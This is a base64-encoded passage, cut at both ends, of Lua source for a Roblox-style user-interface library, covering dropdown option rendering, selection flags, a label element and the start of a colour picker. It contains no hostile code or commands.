udEZhY2UgPSBmb250cy5zbWFsbDsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYig4NiwgODYsIDg3KTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gImF3ZGF3ZGF3ZGF3ZGF3ZGF3ZGF3ZGF3IjsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJkcm9wZG93biIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIC0xMiwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdDsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFRydW5jYXRlID0gRW51bS5UZXh0VHJ1bmNhdGUuQXRFbmQ7CiAgICAgICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNDsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlQYWRkaW5nIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJzdWJfdGV4dCIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFkZGluZ1RvcCA9IGRpbSgwLCAxKTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFkZGluZ1JpZ2h0ID0gZGltKDAsIDUpOwogICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nTGVmdCA9IGRpbSgwLCA1KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAiaW5kaWNhdG9yIiBdID0gbGlicmFyeTpjcmVhdGUoICJJbWFnZUxhYmVsIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgSW1hZ2VDb2xvcjMgPSByZ2IoODYsIDg2LCA4Nyk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJkcm9wZG93biIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgQW5jaG9yUG9pbnQgPSB2ZWMyKDEsIDAuNSk7CiAgICAgICAgICAgICAgICAgICAgICAgIEltYWdlID0gInJieGFzc2V0aWQ6Ly8xMDEwMjU1OTE1NzUxODUiOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDEsIC01LCAwLjUsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMCwgMTIsIDAsIDEyKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgLS0gCgogICAgICAgICAgICAgICAgLS0gRWxlbWVudCBIb2xkZXIKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgImRyb3Bkb3duX2hvbGRlciIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGxpYnJhcnlbICJpdGVtcyIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgIFZpc2libGUgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMCwgMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFpJbmRleCA9IDEwOwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAib3V0bGluZSIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImRyb3Bkb3duX2hvbGRlciIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMSwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIENsaXBzRGVzY2VuZGFudHMgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMzMsIDMzLCAzNSk7CiAgICAgICAgICAgICAgICAgICAgICAgIFpJbmRleCA9IDEwOwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlQYWRkaW5nIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFkZGluZ0JvdHRvbSA9IGRpbSgwLCA2KTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFkZGluZ1RvcCA9IGRpbSgwLCAzKTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFkZGluZ0xlZnQgPSBkaW0oMCwgMyk7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAib3V0bGluZSIgXQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlMaXN0TGF5b3V0IiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJvdXRsaW5lIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nID0gZGltKDAsIDUpOwogICAgICAgICAgICAgICAgICAgICAgICBTb3J0T3JkZXIgPSBFbnVtLlNvcnRPcmRlci5MYXlvdXRPcmRlcgogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgIm91dGxpbmUiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA0KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgLS0gCiAgICAgICAgICAgIGVuZCAKCiAgICAgICAgICAgIGZ1bmN0aW9uIGNmZy5yZW5kZXJfb3B0aW9uKHRleHQpCiAgICAgICAgICAgICAgICBsb2NhbCBidXR0b24gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRCdXR0b24iICwgewogICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuc21hbGw7CiAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYig3MiwgNzIsIDczKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgVGV4dCA9IHRleHQ7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJvdXRsaW5lIiBdOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIC0xMiwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQ7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBBdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlk7CiAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpOwogICAgICAgICAgICAgICAgICAgIFpJbmRleCA9IDEwOwogICAgICAgICAgICAgICAgfSk7IGxpYnJhcnk6YXBwbHlfdGhlbWUoYnV0dG9uLCAiYWNjZW50IiwgIlRleHRDb2xvcjMiKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSVBhZGRpbmciICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGJ1dHRvbjsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nVG9wID0gZGltKDAsIDEpOwogICAgICAgICAgICAgICAgICAgIFBhZGRpbmdSaWdodCA9IGRpbSgwLCA1KTsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nTGVmdCA9IGRpbSgwLCA1KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHJldHVybiBidXR0b24KICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBmdW5jdGlvbiBjZmcuc2V0X3Zpc2libGUoYm9vbCkKICAgICAgICAgICAgICAgIGxvY2FsIGEgPSBib29sIGFuZCBjZmcueV9zaXplIG9yIDAKICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4oaXRlbXNbICJkcm9wZG93bl9ob2xkZXIiIF0sIHtTaXplID0gZGltX29mZnNldChpdGVtc1sgImRyb3Bkb3duIiBdLkFic29sdXRlU2l6ZS5YLCBhKX0pCgogICAgICAgICAgICAgICAgaXRlbXNbICJkcm9wZG93bl9ob2xkZXIiIF0uUG9zaXRpb24gPSBkaW0yKDAsIGl0ZW1zWyAiZHJvcGRvd24iIF0uQWJzb2x1dGVQb3NpdGlvbi5YLCAwLCBpdGVtc1sgImRyb3Bkb3duIiBdLkFic29sdXRlUG9zaXRpb24uWSArIDgwKQogICAgICAgICAgICAgICAgaWYgbm90IChzZWxmLnNhbml0eSBhbmQgbGlicmFyeS5jdXJyZW50X29wZW4gPT0gc2VsZikgdGhlbiAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNsb3NlX2VsZW1lbnQoY2ZnKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgZnVuY3Rpb24gY2ZnLnNldCh2YWx1ZSkKICAgICAgICAgICAgICAgIGxvY2FsIHNlbGVjdGVkID0ge30KICAgICAgICAgICAgICAgIGxvY2FsIGlzVGFibGUgPSB0eXBlKHZhbHVlKSA9PSAidGFibGUiCgogICAgICAgICAgICAgICAgZm9yIF8sIG9wdGlvbiBpbiBjZmcub3B0aW9uX2luc3RhbmNlcyBkbyAKICAgICAgICAgICAgICAgICAgICBpZiBvcHRpb24uVGV4dCA9PSB2YWx1ZSBvciAoaXNUYWJsZSBhbmQgZmluZCh2YWx1ZSwgb3B0aW9uLlRleHQpKSB0aGVuIAogICAgICAgICAgICAgICAgICAgICAgICBpbnNlcnQoc2VsZWN0ZWQsIG9wdGlvbi5UZXh0KQogICAgICAgICAgICAgICAgICAgICAgICBjZmcubXVsdGlfaXRlbXMgPSBzZWxlY3RlZAogICAgICAgICAgICAgICAgICAgICAgICBvcHRpb24uVGV4dENvbG9yMyA9IHRoZW1lcy5wcmVzZXQuYWNjZW50CiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICBvcHRpb24uVGV4dENvbG9yMyA9IHJnYig3MiwgNzIsIDczKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaXRlbXNbICJzdWJfdGV4dCIgXS5UZXh0ID0gaXNUYWJsZSBhbmQgY29uY2F0KHNlbGVjdGVkLCAiLCAiKSBvciBzZWxlY3RlZFsxXSBvciAiIgogICAgICAgICAgICAgICAgZmxhZ3NbY2ZnLmZsYWddID0gaXNUYWJsZSBhbmQgc2VsZWN0ZWQgb3Igc2VsZWN0ZWRbMV0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgY2ZnLmNhbGxiYWNrKGZsYWdzW2NmZy5mbGFnXSkgCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgZnVuY3Rpb24gY2ZnLnJlZnJlc2hfb3B0aW9ucyhsaXN0KSAKICAgICAgICAgICAgICAgIGNmZy55X3NpemUgPSAwCgogICAgICAgICAgICAgICAgZm9yIF8sIG9wdGlvbiBpbiBjZmcub3B0aW9uX2luc3RhbmNlcyBkbyAKICAgICAgICAgICAgICAgICAgICBvcHRpb246RGVzdHJveSgpIAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGNmZy5vcHRpb25faW5zdGFuY2VzID0ge30gCgogICAgICAgICAgICAgICAgZm9yIF8sIG9wdGlvbiBpbiBsaXN0IGRvIAogICAgICAgICAgICAgICAgICAgIGxvY2FsIGJ1dHRvbiA9IGNmZy5yZW5kZXJfb3B0aW9uKG9wdGlvbikKICAgICAgICAgICAgICAgICAgICBjZmcueV9zaXplICs9IGJ1dHRvbi5BYnNvbHV0ZVNpemUuWSArIDYgLS0gc3VwZXIgYW5ub3lpbmcgbWFudWFsIHNpemluZyBidXQgb2ggd2VsbAogICAgICAgICAgICAgICAgICAgIGluc2VydChjZmcub3B0aW9uX2luc3RhbmNlcywgYnV0dG9uKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGJ1dHRvbi5JbnB1dEJlZ2FuOkNvbm5lY3QoZnVuY3Rpb24oSW5wdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBJbnB1dC5Vc2VySW5wdXRUeXBlIH49IEVudW0uVXNlcklucHV0VHlwZS5Ub3VjaCB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgaWYgY2ZnLm11bHRpIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBzZWxlY3RlZF9pbmRleCA9IGZpbmQoY2ZnLm11bHRpX2l0ZW1zLCBidXR0b24uVGV4dCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgc2VsZWN0ZWRfaW5kZXggdGhlbiAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZW1vdmUoY2ZnLm11bHRpX2l0ZW1zLCBzZWxlY3RlZF9pbmRleCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnNlcnQoY2ZnLm11bHRpX2l0ZW1zLCBidXR0b24uVGV4dCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjZmcuc2V0KGNmZy5tdWx0aV9pdGVtcykgCQkJCQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2ZnLnNldF92aXNpYmxlKGZhbHNlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2ZnLm9wZW4gPSBmYWxzZSAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2ZnLnNldChidXR0b24uVGV4dCkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgaXRlbXNbICJkcm9wZG93biIgXS5JbnB1dEJlZ2FuOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQpCiAgICAgICAgICAgICAgICBpZiBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Ub3VjaCBvciBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Ub3VjaCB0aGVuCiAgICAgICAgICAgICAgICAgICAgY2ZnLm9wZW4gPSBub3QgY2ZnLm9wZW4gIAogICAgICAgICAgICAgICAgICAgIGNmZy5zZXRfdmlzaWJsZShjZmcub3BlbikKICAgICAgICAgICAgICAgIGVuZCAKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgaWYgY2ZnLnNlcGVyYXRvciB0aGVuIAogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgQW5jaG9yUG9pbnQgPSB2ZWMyKDAsIDEpOwogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IHNlbGYuaXRlbXNbICJlbGVtZW50cyIgXTsKICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMCwgMCwgMSwgMCk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIDEsIDAsIDEpOwogICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigzNiwgMzYsIDM3KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIGVuZCAKCiAgICAgICAgICAgIGZsYWdzW2NmZy5mbGFnXSA9IHt9IAogICAgICAgICAgICBjb25maWdfZmxhZ3NbY2ZnLmZsYWddID0gY2ZnLnNldAogICAgICAgICAgICAKICAgICAgICAgICAgY2ZnLnJlZnJlc2hfb3B0aW9ucyhjZmcub3B0aW9ucykKICAgICAgICAgICAgY2ZnLnNldChjZmcuZGVmYXVsdCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICByZXR1cm4gc2V0bWV0YXRhYmxlKGNmZywgbGlicmFyeSkKICAgICAgICBlbmQKCiAgICAgICAgZnVuY3Rpb24gbGlicmFyeTpsYWJlbChvcHRpb25zKQogICAgICAgICAgICBsb2NhbCBjZmcgPSB7CiAgICAgICAgICAgICAgICBlbmFibGVkID0gb3B0aW9ucy5lbmFibGVkIG9yIG5pbCwKICAgICAgICAgICAgICAgIG5hbWUgPSBvcHRpb25zLm5hbWUgb3IgIlRvZ2dsZSIsCiAgICAgICAgICAgICAgICBzZXBlcmF0b3IgPSBvcHRpb25zLnNlcGVyYXRvciBvciBvcHRpb25zLlNlcGVyYXRvciBvciBmYWxzZTsKICAgICAgICAgICAgICAgIGluZm8gPSBvcHRpb25zLmluZm8gb3IgbmlsOyAKCiAgICAgICAgICAgICAgICBpdGVtcyA9IHt9OwogICAgICAgICAgICB9CgogICAgICAgICAgICBsb2NhbCBpdGVtcyA9IGNmZy5pdGVtczsgZG8gCiAgICAgICAgICAgICAgICBpdGVtc1sgImxhYmVsIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0QnV0dG9uIiAsIHsKICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLnNtYWxsOwogICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFRleHQgPSAiIjsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBzZWxmLml0ZW1zWyAiZWxlbWVudHMiIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBBdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlk7CiAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJuYW1lIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0TGFiZWwiICwgewogICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuc21hbGw7CiAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYigyNDUsIDI0NSwgMjQ1KTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgVGV4dCA9IGNmZy5uYW1lOwogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAibGFiZWwiIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQ7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBBdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlhZOwogICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTY7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAgICAgaWYgY2ZnLmluZm8gdGhlbiAKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgImluZm8iIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRMYWJlbCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuc21hbGw7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoMTMwLCAxMzAsIDEzMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFdyYXBwZWQgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gY2ZnLmluZm87CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAibGFiZWwiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMCwgNSwgMCwgMTcpOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAtMTAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQ7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWFk7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTY7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIGVuZCAKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSVBhZGRpbmciICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAibmFtZSIgXTsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nUmlnaHQgPSBkaW0oMCwgNSk7CiAgICAgICAgICAgICAgICAgICAgUGFkZGluZ0xlZnQgPSBkaW0oMCwgNSkKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpdGVtc1sgInJpZ2h0X2NvbXBvbmVudHMiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImxhYmVsIiBdOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigxLCAwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMCwgMCwgMSwgMCk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUxpc3RMYXlvdXQiICwgewogICAgICAgICAgICAgICAgICAgIEZpbGxEaXJlY3Rpb24gPSBFbnVtLkZpbGxEaXJlY3Rpb24uSG9yaXpvbnRhbDsKICAgICAgICAgICAgICAgICAgICBIb3Jpem9udGFsQWxpZ25tZW50ID0gRW51bS5Ib3Jpem9udGFsQWxpZ25tZW50LlJpZ2h0OwogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAicmlnaHRfY29tcG9uZW50cyIgXTsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nID0gZGltKDAsIDkpOwogICAgICAgICAgICAgICAgICAgIFNvcnRPcmRlciA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyCiAgICAgICAgICAgICAgICB9KTsgICAgICAgICAgICAgICAgCiAgICAgICAgICAgIGVuZCAKCiAgICAgICAgICAgIGlmIGNmZy5zZXBlcmF0b3IgdGhlbiAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigwLCAxKTsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBzZWxmLml0ZW1zWyAiZWxlbWVudHMiIF07CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDAsIDEsIDApOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAxLCAwLCAxKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMzYsIDM2LCAzNykKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICBlbmQgCgogICAgICAgICAgICByZXR1cm4gc2V0bWV0YXRhYmxlKGNmZywgbGlicmFyeSkKICAgICAgICBlbmQgCiAgICAgICAgCiAgICAgICAgZnVuY3Rpb24gbGlicmFyeTpjb2xvcnBpY2tlcihvcHRpb25zKSAKICAgICAgICAgICAgbG9jYWwgY2ZnID0